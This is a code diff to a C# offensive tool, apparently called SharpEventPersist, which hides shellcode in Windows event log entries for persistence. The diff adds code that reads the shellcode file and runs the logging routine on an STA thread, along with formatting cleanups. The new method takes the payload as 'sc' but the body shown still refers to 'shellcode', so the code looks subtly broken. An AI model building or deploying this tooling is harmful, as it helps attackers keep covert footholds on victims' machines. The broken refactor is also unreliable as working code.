@@ -5,6 +5,7 @@ using System.IO;
 using System.Linq;
 using NDesk.Options;
 using System.Security.Principal;
+using System.Threading;
 
 namespace SharpEventPersist
 {
@@ -52,7 +53,7 @@ namespace SharpEventPersist
             return principal.IsInRole(WindowsBuiltInRole.Administrator);
         }
 
-        static void Main(string [] args)
+        static void Main(string[] args)
         {
 
             if (args == null)
@@ -95,6 +96,15 @@ namespace SharpEventPersist
             if (string.IsNullOrEmpty(instanceid))
                 instanceid = "1337";
 
+            byte[] shellcode = File.ReadAllBytes(file);
+
+            Thread staThread = new Thread(() => doSTuff(shellcode, file, eventlog, instanceid, source));
+            staThread.SetApartmentState(ApartmentState.STA);
+            staThread.Start();
+        }
+
+        static void doSTuff(byte[] sc, string file, string eventlog, string instanceid, string source)
+        { 
             Console.WriteLine("Using shellcode: " + file);
             Console.WriteLine("Setting event log instance id: " + instanceid);
             Console.WriteLine("Setting event log source to: " + source);
@@ -113,7 +123,7 @@ namespace SharpEventPersist
 
             for (var i = 0; i < realcount; i++)
                 delegate_bytes(source, instanceid, eventlog, shellcode, 8000, i * 8000);
-            
+
             delegate_bytes(source, instanceid, eventlog, shellcode, remainder, realcount * 8000);
 
             var entries = log.Entries.Cast<EventLogEntry>().Where(x => x.InstanceId == instanceint).ToList();
@@ -121,13 +131,14 @@ namespace SharpEventPersist
             if (entries.Count == EventWrites)
             {
                 Console.WriteLine("Successfully wrote " + entries.Count + " entries to the log " + log.LogDisplayName);
-            } else
+            }
+            else
             {
-                Console.WriteLine("Number of entires in "+ log.LogDisplayName + "does not match times the Event Write function was called. Do not expect persistence to work.");
+                Console.WriteLine("Number of entires in " + log.LogDisplayName + "does not match times the Event Write function was called. Do not expect persistence to work.");
             }
 
 
         }
-        
+
     }
 }
